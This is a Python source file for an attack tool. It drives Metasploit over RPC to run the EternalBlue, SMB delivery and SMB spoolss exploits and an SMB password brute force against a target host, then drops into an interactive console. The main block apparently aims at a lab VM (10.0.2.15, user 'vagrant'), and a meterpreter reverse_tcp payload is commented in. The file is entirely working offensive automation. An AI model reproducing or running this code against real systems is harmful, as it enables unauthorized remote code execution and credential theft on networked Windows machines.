from time import sleep

# import Modules
from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PayloadModule, MsfConsole

from src.libs.Tools import Get_Printer
from src.libs.Tools import get_ipv4
from src.libs.modules.list.Exploit_List import Exploit
from src.libs.modules.list.Payload_List import Payload
from src.libs.modules.list.Exploit_List import Auxiliary

#
class Attack:
    __rpc: MsfRpcClient
    __rhost: str
    __exploit_path: Exploit
    __payload: Payload
    __module: ExploitModule
    __console: MsfConsole

    #
    def __init__(self,
                 rpc: MsfRpcClient,
                 rhost: str = None,
                 exploit: Exploit = None,
                 payload: Payload = None):
        self.__rpc = rpc
        self.__rhost = rhost
        self.__exploit_path = exploit
        self.__payload = payload
        self.__ipv4 = get_ipv4()
        self.__console = None
        print('initialize successful')
# 
    def setExploit(self, exploit: Exploit):
        self.__exploit_path = exploit
# 
    def setPayload(self, payload: Payload):
        self.__payload = payload
# 
    def run_eternal_blue(self):

        mname = self.__exploit_path
        self.__module = self.__rpc.modules.use("exploit", mname)

        self.__module['RHOSTS'] = self.__rhost
        cid = self.__rpc.consoles.console().cid
        __console = self.__rpc.consoles.console(cid)
        print(
            __console.run_module_with_output(self.__module, PayloadModule(self.__rpc, self.__payload.value))
        )
# 
    def run_smb_delivery(self):

        mname = self.__exploit_path
        self.__module = self.__rpc.modules.use("exploit", mname)
        
        self.__module.target = 0  # {0: 'DLL', 1: 'PSH'}
        self.__module["SRVHOST"] = self.__ipv4
        self.__module['SRVPORT'] = 4445

        cid = self.__rpc.consoles.console().cid
        __console = self.__rpc.consoles.console(cid)
        
        print(
            __console.run_module_with_output(self.__module)
        )
        # Maybe show in GUI
    def run_smb_spoolss(self):

        mname = self.__exploit_path
        self.__module = self.__rpc.modules.use("exploit", mname)
        
        self.__module["RHOSTS"] = self.__rhost
        self.__module["PNAME"] = Get_Printer(self.__rhost)[0]
        
        cid = self.__rpc.consoles.console().cid
        self.__console = self.__rpc.consoles.console(cid)

        print(
            self.__console.run_module_with_output(self.__module, PayloadModule(self.__rpc, self.__payload))
        )

    def run_password_brute_force(self):
        mname = self.__exploit_path
        self.__module = self.__rpc.modules.use("auxiliary", mname)

        self.__module["RHOSTS"] = self.__rhost
        self.__module["SMBUser"] = "vagrant" # for test
        # self.__module["SMBPass"] = "vagrant2"

        self.__module["PASS_FILE"] = "PassList/test_pwd.txt"
        # self.__module["USER_FILE"] = 
        cid = self.__rpc.consoles.console().cid
        self.__console = self.__rpc.consoles.console(cid)

        print(
            self.__console.run_module_with_output(self.__module)
        )

    def Get_console(self):
        while True:
            print(self.__console.read()["data"])
            sleep(0.5)
            cmd = input("CMD: ")
            self.__console.write(cmd)
            if cmd == "break":
                break
 
if __name__ == '__main__':
    # connection
    client = MsfRpcClient("salt", port=55553, ssl=True)
    atk = Attack(client, rhost="10.0.2.15")
    
    # init
    atk.setExploit(Auxiliary.SMB_LOGIN)
    atk.run_password_brute_force()
    # atk.setPayload('windows/meterpreter/reverse_tcp')


    # attack
    # atk.run_smb_spoolss()
    atk.Get_console()
